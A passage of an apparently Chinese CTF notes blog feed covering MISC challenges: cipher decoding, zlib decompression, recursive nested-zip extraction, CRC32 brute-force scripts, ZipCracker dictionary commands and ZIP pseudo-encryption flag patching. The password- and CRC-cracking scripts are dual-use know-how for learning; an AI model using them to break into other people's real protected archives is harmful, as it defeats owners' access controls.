FromQwerty(&quot;bolkqltqelxxbmnabktctklt&quot;)<br></code></pre></td></tr></table></figure><p>可以先用 txt 粘贴进去，再改名为 1.vbs，点击即可得到</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1722316540944-3766bb25-5657-4eec-9f28-1e3128615dff-296442.png" alt="1722316540944-3766bb25-5657-4eec-9f28-1e3128615dff.png"></p><p>xisraseacsuuxzykxreverse</p><p>这一个就是 reverse，即把这句话反过来</p><p>print(‘xisraseacsuuxzykx’[::-1])</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1722316590347-232b97e5-3ce1-499d-bcd9-b4c5483c744c-555408.png" alt="1722316590347-232b97e5-3ce1-499d-bcd9-b4c5483c744c.png"></p><p>得到</p><p>xkyzxuuscaesarsix</p><p>看 T4，它是有空格的，所以这个加密是caesar six，即偏移量为6的凯撒密码</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1722316697736-40093dcc-c4b4-44d6-8cfb-db2ed4c082e8-266534.png" alt="1722316697736-40093dcc-c4b4-44d6-8cfb-db2ed4c082e8.png"></p><p>得到restroom</p><p>最后还有一个reverse</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1722316748891-3f830f80-4d5d-491a-84b9-221f62e1f456-438135.png" alt="1722316748891-3f830f80-4d5d-491a-84b9-221f62e1f456.png"></p><p>NSSCTF{moortser}</p><blockquote><p>更新: 2025-04-19 14:19:43<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/sl8yh85l5tqrxiyg">https://www.yuque.com/chaye-apqbl/vsc85q/sl8yh85l5tqrxiyg</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h1><p>使用winrar进行压缩解压，用bandzip可能导致压缩后的文件大小不一样</p><p>会报错，不能攻击<img src="/./img/RgCeSKNnsfnDiT-_/1730951752697-0df9f019-2684-433b-810a-f6e017dce816-172089.png" alt="1730951752697-0df9f019-2684-433b-810a-f6e017dce816.png"></p><blockquote><p>更新: 2024-11-07 11:56:54<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/lp2fie23c3cblq11">https://www.yuque.com/chaye-apqbl/vsc85q/lp2fie23c3cblq11</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zlib%E8%A7%A3%E5%8E%8B/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zlib%E8%A7%A3%E5%8E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="zlib解压"><a href="#zlib解压" class="headerlink" title="zlib解压"></a>zlib解压</h1><p><img src="/./img/ygPIiZhNZ-vsJQey/1742623659182-dd2e7464-3890-47a6-a504-31306ef31b08-705309.png" alt="1742623659182-dd2e7464-3890-47a6-a504-31306ef31b08.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zlib<br>import binascii<br><br>id = &#x27;78DA955059AE033108BB92096B8E93F5FE47289369D5D78F57A94804C9011BA3900E86A001E838B14AC0BAB841597A58B11BA776D7EC060DC0CC8691B9AA0A6AE25C62BB1435D41D5775F538AC04D99AEF9926B969FA54479BABA8D858BE060DAAC494C3C48EA89B8BA42A43277590B5A408B69E780CC5C65E439BAC42532F1F39F3DFCEE79F5068A5DB5FBD06DE717B4093A017F47107FD7B87EFFECF4E0AFBE0CE94A7B63FFBAE7E996CCC4EB2C42E25A952982D24455C99855979F27C00613B670A&#x27;<br>result = binascii.unhexlify(id)<br>print(result)<br>result = zlib.decompress(result)<br>print(result)<br><br></code></pre></td></tr></table></figure><h4 id="1-安装工具"><a href="#1-安装工具" class="headerlink" title="(1) 安装工具"></a><strong>(1) 安装工具</strong></h4><p><strong>Linux&#x2F;macOS</strong>：使用 <code>openssl</code>（系统自带）或 <code>pigz</code>：</p><ul><li>bash复制</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 安装pigz（可选）<br>sudo apt-get install pigz  # Debian/Ubuntu<br>brew install pigz         # macOS<br></code></pre></td></tr></table></figure><h4 id="2-解压命令"><a href="#2-解压命令" class="headerlink" title="(2) 解压命令"></a><strong>(2) 解压命令</strong></h4><p><strong>方法一：openssl</strong></p><ul><li>bash复制openssl zlib -d -in compressed.zlib -out decompressed.txt</li></ul><p><strong>方法二：pigz</strong></p><ul><li>bash复制pigz -dzk compressed.zlib -S .zlib &gt; decompressed.txt</li></ul><blockquote><p>更新: 2025-03-23 10:40:04<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wa63cr36ep59i3ig">https://www.yuque.com/chaye-apqbl/vsc85q/wa63cr36ep59i3ig</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zip%E6%A0%BC%E5%BC%8F/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zip%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="zip格式"><a href="#zip格式" class="headerlink" title="zip格式"></a>zip格式</h1><h2 id="压缩格式"><a href="#压缩格式" class="headerlink" title="压缩格式"></a>压缩格式</h2><p><img src="/./img/HcRHKRA2FkHygd5O/1744959646125-41e27895-d2b5-4c92-ac54-5ae6f96a4ecd-702114.png" alt="1744959646125-41e27895-d2b5-4c92-ac54-5ae6f96a4ecd.png"></p><p><img src="/./img/HcRHKRA2FkHygd5O/1744959656286-daecf83c-0ac8-46dc-be32-97f24fc9e656-513501.png" alt="1744959656286-daecf83c-0ac8-46dc-be32-97f24fc9e656.png"></p><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p><img src="/./img/HcRHKRA2FkHygd5O/1744959863448-3fee63dd-4ecf-4111-8d4e-da479e98c2dc-249672.png" alt="1744959863448-3fee63dd-4ecf-4111-8d4e-da479e98c2dc.png"></p><blockquote><p>更新: 2025-04-18 15:04:37<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/upinu7gyaz33gkln">https://www.yuque.com/chaye-apqbl/vsc85q/upinu7gyaz33gkln</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zip%E5%A5%97%E5%A8%83%E7%88%86%E7%A0%B4/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zip%E5%A5%97%E5%A8%83%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="zip套娃爆破"><a href="#zip套娃爆破" class="headerlink" title="zip套娃爆破"></a>zip套娃爆破</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zipfile<br>import os<br><br># 初始设置：压缩包存储目录和初始zip文件名称<br>&quot;&quot;&quot;只要修改路径和需要解压的压缩包即可&quot;&quot;&quot;<br>zip_directory = r&#x27;D:\网站下载\taowa&#x27;<br>zip_name = &#x27;999.zip&#x27;<br><br># 循环解压嵌套的压缩包<br>while True:<br>    # 拼接当前的完整压缩包路径<br>    zip_path = os.path.join(zip_directory, zip_name)<br><br>    # 打开当前压缩包<br>    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as myzip:<br>        # 获取压缩包内文件列表<br>        file_list = myzip.namelist()<br><br>        # 判断是否有zip文件，提取文件名<br>        if not any(&#x27;.zip&#x27; in f for f in file_list):  # 如果文件列表中没有zip文件<br>            print(f&quot;Final unzipped location: &#123;zip_path&#125;&quot;)<br>            # 解压到目标目录<br>            myzip.extractall(os.path.join(zip_directory, &#x27;final&#x27;))<br>            break  # 终止循环<br>        else:<br>            # 如果文件列表中有zip文件，提取其中第一个zip文件<br>            for file_name in file_list:<br>                if file_name.endswith(&#x27;.zip&#x27;):<br>                    zip_name = file_name  # 更新zip_name为内部的zip文件<br>                    break<br>            # 解压当前的zip包到同级目录<br>            myzip.extractall(zip_directory)<br></code></pre></td></tr></table></figure><p>import os</p><p>def find_deepest_txt_file(root_dir):<br>    deepest_path &#x3D; ‘’<br>    max_depth &#x3D; -1<br>    txt_file_path &#x3D; ‘’</p><pre><code class="hljs">for current_dir, dirs, files in os.walk(root_dir):    depth = current_dir.count(os.sep)    if depth &gt; max_depth and any(f.endswith(&#39;.txt&#39;) for f in files):        max_depth = depth        deepest_path = current_dir        # 只读取第一个 .txt 文件（如果有多个可以改成循环）        for f in files:            if f.endswith(&#39;.txt&#39;):                txt_file_path = os.path.join(current_dir, f)                breakif txt_file_path:    print(f&#39;找到的最深层 .txt 文件路径是:\n&#123;txt_file_path&#125;\n&#39;)    with open(txt_file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:        content = file.read()    print(&#39;文件内容如下:\n&#39;)    print(content)else:    print(&#39;没有找到 .txt 文件&#39;)</code></pre><p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    root_dir &#x3D; ‘next_or_end&#x2F;‘  # 可修改为你的起始目录<br>    find_deepest_txt_file(root_dir)</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="解不完的压缩包"><a href="#解不完的压缩包" class="headerlink" title="解不完的压缩包"></a>解不完的压缩包</h2><h3 id="这里附上爆破脚本（使用时记得修改初始设置）"><a href="#这里附上爆破脚本（使用时记得修改初始设置）" class="headerlink" title="这里附上爆破脚本（使用时记得修改初始设置）"></a>这里附上爆破脚本（使用时记得修改初始设置）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zipfile<br>import os<br><br># 初始设置：压缩包存储目录和初始zip文件名称<br>&quot;&quot;&quot;只要修改路径和需要解压的压缩包即可&quot;&quot;&quot;<br>zip_directory = r&#x27;D:\网站下载\taowa&#x27;<br>zip_name = &#x27;999.zip&#x27;<br><br># 循环解压嵌套的压缩包<br>while True:<br>    # 拼接当前的完整压缩包路径<br>    zip_path = os.path.join(zip_directory, zip_name)<br><br>    # 打开当前压缩包<br>    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as myzip:<br>        # 获取压缩包内文件列表<br>        file_list = myzip.namelist()<br><br>        # 判断是否有zip文件，提取文件名<br>        if not any(&#x27;.zip&#x27; in f for f in file_list):  # 如果文件列表中没有zip文件<br>            print(f&quot;Final unzipped location: &#123;zip_path&#125;&quot;)<br>            # 解压到目标目录<br>            myzip.extractall(os.path.join(zip_directory, &#x27;final&#x27;))<br>            break  # 终止循环<br>        else:<br>            # 如果文件列表中有zip文件，提取其中第一个zip文件<br>            for file_name in file_list:<br>                if file_name.endswith(&#x27;.zip&#x27;):<br>                    zip_name = file_name  # 更新zip_name为内部的zip文件<br>                    break<br>            # 解压当前的zip包到同级目录<br>            myzip.extractall(zip_directory)<br></code></pre></td></tr></table></figure><p>拿到1.zip</p><p><img src="/./img/49277317_K25ii9e9BShTlNGg/1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f-959742.png" alt="1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f.png"></p><p>发现解压要密码</p><p><img src="/./img/49277317_K25ii9e9BShTlNGg/1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165-981648.png" alt="1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165.png"></p><p>crcexp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plain">from binascii import crc32<br>import string<br>import zipfile<br><br>dic = string.printable<br><br><br>def CrackCrc(crc):<br>    for i in dic:<br>        # print (i)<br>        for j in dic:<br>            s = i + j<br>            # print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)<br>            if crc == (crc32(bytes(s, &#x27;ascii&#x27;)) &amp; 0xffffffff):<br>                print(s)<br>                return<br><br><br>def getcrc32(fname):<br>    l = []<br>    file = fname<br>    f = zipfile.ZipFile(file, &#x27;r&#x27;)<br>    global fileList<br>    fileList = f.namelist()<br>    print(fileList)<br>    # print (type(fileList))<br>    for filename in fileList:<br>        Fileinfo = f.getinfo(filename)<br>        # print(Fileinfo)<br>        crc = Fileinfo.CRC<br>        # print (&#x27;crc&#x27;,crc)<br>        l.append(crc)<br>    return l<br><br><br>def main(filename=None):<br>    l = getcrc32(filename)<br>    # print(l)<br>    for i in range(len(l)):<br>        print(fileList[i], end=&#x27;的内容是:&#x27;)<br>        CrackCrc(l[i])<br><br><br>if __name__ == &quot;__main__&quot;:<br>    main(&#x27;cccccccrc.zip&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_K25ii9e9BShTlNGg/1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824-186996.png" alt="1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824.png"></p><p>密码*m:#P7j0</p><p><img src="/./img/49277317_K25ii9e9BShTlNGg/1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5-086270.png" alt="1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5.png"></p><blockquote><p>更新: 2024-09-24 15:57:34<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/xqwsgv9y6oifi0yf">https://www.yuque.com/chaye-apqbl/vsc85q/xqwsgv9y6oifi0yf</a></p></blockquote><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>|   ||—||import os||||def find_deepest_txt_file(root_dir):||deepest_path &#x3D; ‘’||max_depth &#x3D; -1||txt_file_path &#x3D; ‘’||||for current_dir, dirs, files in os.walk(root_dir):||depth &#x3D; current_dir.count(os.sep)||if depth &gt; max_depth and any(f.endswith(‘.txt’) for f in files):||max_depth &#x3D; depth||deepest_path &#x3D; current_dir||# 只读取第一个 .txt 文件（如果有多个可以改成循环）||for f in files:||if f.endswith(‘.txt’):||txt_file_path &#x3D; os.path.join(current_dir, f)||break||||if txt_file_path:||print(f’找到的最深层 .txt 文件路径是:\n{txt_file_path}\n’)||with open(txt_file_path, ‘r’, encoding&#x3D;’utf-8’) as file:||content &#x3D; file.read()||print(‘文件内容如下:\n’)||print(content)||else:||print(‘没有找到 .txt 文件’)||||if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:||root_dir &#x3D; ‘next_or_end&#x2F;‘ # 可修改为你的起始目录||find_deepest_txt_file(root_dir)|||<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zipcracker/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/zipcracker/</url>
    
    <content type="html"><![CDATA[<h1 id="zipcracker"><a href="#zipcracker" class="headerlink" title="zipcracker"></a>zipcracker</h1><p><a href="https://blog.csdn.net/asaotomo/article/details/132005223">Zip伪加密破解神器——ZipCracker-CSDN博客</a></p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h5 id="1-伪加密识别及修复"><a href="#1-伪加密识别及修复" class="headerlink" title="1.伪加密识别及修复"></a><font style="color:rgb(79, 79, 79);">1.伪加密识别及修复</font></h5><p>python ZipCracker.py test01.zip</p><h5 id="2-暴力破解-内置字典"><a href="#2-暴力破解-内置字典" class="headerlink" title="2.暴力破解-内置字典"></a><font style="color:rgb(79, 79, 79);">2.暴力破解-内置字典</font></h5><p>python ZipCracker.py test02.zip</p><h5 id="3-暴力破解-用户自定义字典"><a href="#3-暴力破解-用户自定义字典" class="headerlink" title="3.暴力破解-用户自定义字典"></a><font style="color:rgb(79, 79, 79);">3.暴力破解-用户自定义字典</font></h5><p>python ZipCracker.py test02.zip MyDict.txt</p><blockquote><p>更新: 2024-10-17 10:37:57<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gp7o3rtgggfdb4h8">https://www.yuque.com/chaye-apqbl/vsc85q/gp7o3rtgggfdb4h8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/index/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/index/</url>
    
    <content type="html"><![CDATA[<h1 id="zip解密"><a href="#zip解密" class="headerlink" title="zip解密"></a>zip解密</h1><h1 id="ZIP伪加密解析"><a href="#ZIP伪加密解析" class="headerlink" title="ZIP伪加密解析"></a><font style="color:rgb(51, 51, 51);">ZIP伪加密解析</font></h1><h2 id="1、zip组成"><a href="#1、zip组成" class="headerlink" title="1、zip组成"></a><font style="color:rgb(51, 51, 51);">1、zip组成</font></h2><p><font style="color:rgb(51, 51, 51);">一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</font></p><p><a href="https://blog.csdn.net/wclxyn/article/details/7288994"><font style="color:rgb(33, 37, 41);">一个zip文件由这样三个部分组成_zip 文件结构_一只独孤的程序猿的博客-CSDN博客</font></a></p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a><font style="color:rgb(51, 51, 51);">2、实例</font></h2><p><img src="/./img/2dO8o0nwkFShzl0Y/1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16-564464.png" alt="1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16.png"></p><p><strong><font style="color:rgb(51, 51, 51);">压缩源文件数据区：</font></strong><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">50 4B 03 04：这是头文件标记（0x04034b50）<br></font><font style="color:rgb(51, 51, 51);">14 00：解压文件所需 pkware 版本<br></font><font style="color:rgb(51, 51, 51);">00 00：全局方式位标记（有无加密）</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">头文件标记后2bytes</font></strong><font style="color:rgb(51, 51, 51);"><br></font><strong><font style="color:rgb(51, 51, 51);">压缩源文件目录区：</font></strong></p><p><font style="color:rgb(51, 51, 51);">50 4B 01 02：目录中文件文件头标记(0x02014b50)</font></p><p><font style="color:rgb(51, 51, 51);">3F 00：压缩使用的 pkware 版本</font></p><p><font style="color:rgb(51, 51, 51);">14 00：解压文件所需 pkware 版本<br></font><font style="color:rgb(51, 51, 51);">00 00：全局方式位标记（有无加密，伪加密的关键）</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">目录文件标记后4bytes</font></strong><font style="color:rgb(51, 51, 51);"><br></font><strong><font style="color:rgb(51, 51, 51);">压缩源文件目录结束标志：</font></strong><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">50 4B 05 06：目录结束标记</font></p><h2 id="3、全局方式位标记"><a href="#3、全局方式位标记" class="headerlink" title="3、全局方式位标记"></a><font style="color:rgb(51, 51, 51);">3、全局方式位标记</font></h2><p><font style="color:rgb(51, 51, 51);">全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br></font><strong><font style="color:rgb(51, 51, 51);">第二个数字为奇数时 –&gt;加密</font></strong><font style="color:rgb(51, 51, 51);"><br></font><strong><font style="color:rgb(51, 51, 51);">第二个数字为偶数时 –&gt;未加密</font></strong></p><h2 id="4、辨别zip是真加密还是伪加密"><a href="#4、辨别zip是真加密还是伪加密" class="headerlink" title="4、辨别zip是真加密还是伪加密"></a><font style="color:rgb(51, 51, 51);">4、辨别zip是真加密还是伪加密</font></h2><h3 id="1）无加密"><a href="#1）无加密" class="headerlink" title="1）无加密"></a><font style="color:rgb(51, 51, 51);">1）无加密</font></h3><p><font style="color:rgb(51, 51, 51);">压缩源文件数据区的全局加密应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">00 00</font><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">（504B0304两个bytes之后）<br></font><font style="color:rgb(51, 51, 51);">且压缩源文件目录区的全局方式位标记应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">00 00</font><font style="color:rgb(51, 51, 51);">（504B0304四个bytes之后）</font></p><p><img src="/./img/2dO8o0nwkFShzl0Y/1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c-855414.png" alt="1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c.png"></p><h3 id="2）伪加密"><a href="#2）伪加密" class="headerlink" title="2）伪加密"></a><font style="color:rgb(51, 51, 51);">2）伪加密</font></h3><p><font style="color:rgb(51, 51, 51);">压缩源文件数据区的全局加密应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">00 00</font><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">且压缩源文件目录区的全局方式位标记应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">09 00</font></p><p><img src="/./img/2dO8o0nwkFShzl0Y/1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb-934021.png" alt="1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb.png"></p><h3 id="3）真加密"><a href="#3）真加密" class="headerlink" title="3）真加密"></a><font style="color:rgb(51, 51, 51);">3）真加密</font></h3><p><font style="color:rgb(51, 51, 51);">压缩源文件数据区的全局加密应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">09 00</font><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">且压缩源文件目录区的全局方式位标记应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">09 00</font><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">!</font></p><p><img src="/./img/2dO8o0nwkFShzl0Y/1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb-877511.png" alt="1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a><font style="color:rgb(33, 37, 41);">例题</font></h2><p><font style="color:rgb(33, 37, 41);">把压缩包拖到winhex里打利用WinHex搜索，快速定位到目录区头文件标记处开，50 4B 03 04，这是压缩源文件数据区头文件标记，50 4B 01 02，这是压缩源文件目录区头文件标记，以50为第一处，找到第9、10处数值位置，第9处数值如果是奇数就代表有密码，偶数代表无密码</font></p><p><img src="/./img/2dO8o0nwkFShzl0Y/1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969-381128.png" alt="1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969.png"></p><p>第九位是偶数属于伪加密</p><p><img src="/./img/2dO8o0nwkFShzl0Y/1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2-619906.png" alt="1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2.png"></p><p>把09 00 改成00 00保存后就能打开了</p><blockquote><p>更新: 2024-11-13 10:02:41<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/mkm9yifo2oqfg2ak">https://www.yuque.com/chaye-apqbl/vsc85q/mkm9yifo2oqfg2ak</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/crc%E7%88%86%E7%A0%B4/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/crc%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="crc爆破"><a href="#crc爆破" class="headerlink" title="crc爆破"></a>crc爆破</h1><p><a href="https://github.com/theonlypwner/crc32">theonlypwner&#x2F;crc32: CRC32 tools: reverse, undo&#x2F;rewind, and calculate hashes (github.com)</a></p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2025/zip/42988179/1761286186208-16ce4a86-feb5-4560-81c4-cc4d779ae8ef.zip">zipCrcCracker-main.zip</a></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plain">from binascii import crc32<br>import string<br>import zipfile<br><br>dic = string.printable<br><br><br>def CrackCrc(crc):<br>    for i in dic:<br>        # print (i)<br>        for j in dic:<br>            for p in dic:<br>                for q in dic:<br>                    s = i + j + p + q<br>                    # print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)<br>                    if crc == (crc32(bytes(s, &quot;ascii&quot;)) &amp; 0xFFFFFFFF):<br>                        print(s)<br>                        return<br><br><br>def getcrc32(fname):<br>    l = []<br>    file = fname<br>    f = zipfile.ZipFile(file, &quot;r&quot;)<br>    global fileList<br>    fileList = f.namelist()<br>    print(fileList)<br>    # print (type(fileList))<br>    for filename in fileList:<br>        Fileinfo = f.getinfo(filename)<br>        # print(Fileinfo)<br>        crc = Fileinfo.CRC<br>        # print (&#x27;crc&#x27;,crc)<br>        l.append(crc)<br>    return l<br><br><br>def main(filename=None):<br>    l = getcrc32(filename)<br>    # print(l)<br>    for i in range(len(l)):<br>        print(fileList[i], end=&quot;的内容是:&quot;)<br>        CrackCrc(l[i])<br><br><br>if __name__ == &quot;__main__&quot;:<br>    main(&quot;套.zip&quot;)<br></code></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="0xgame2025"><a href="#0xgame2025" class="headerlink" 